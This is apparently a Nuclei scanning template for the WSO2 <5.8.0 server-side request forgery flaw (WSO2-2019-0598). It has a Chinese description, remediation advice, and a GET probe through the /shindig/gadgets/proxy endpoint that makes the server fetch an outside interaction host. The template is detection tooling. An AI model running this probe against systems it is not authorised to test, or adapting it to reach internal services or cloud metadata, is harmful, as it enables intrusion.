id: WSO2-2019-0598

info:
  name: WSO2 <5.8.0 - 服务端请求伪造
  author: Amnotacat
  severity: medium
  description: WSO2 <5.8.0 - 服务端请求伪造 存在服务端请求伪造漏洞。攻击者可诱使服务器向任意地址发起请求，进而探测内网服务、访问云元数据或绕过边界访问控制。
  remediation: |
    - 限制服务器对外和对内的可访问地址范围，禁止访问云元数据地址与敏感内网段。
    - 对 URL、协议、端口和重定向目标进行严格校验，并启用出站访问控制。
  reference:
    - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2019-0598
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 6.8
    cwe-id: CWE-918
  metadata:
    max-request: 1
  tags: ssrf,wso2,shindig,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/shindig/gadgets/proxy?container=default&url=http://oast.pro"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Interactsh Server"

      - type: status
        status:
          - 200
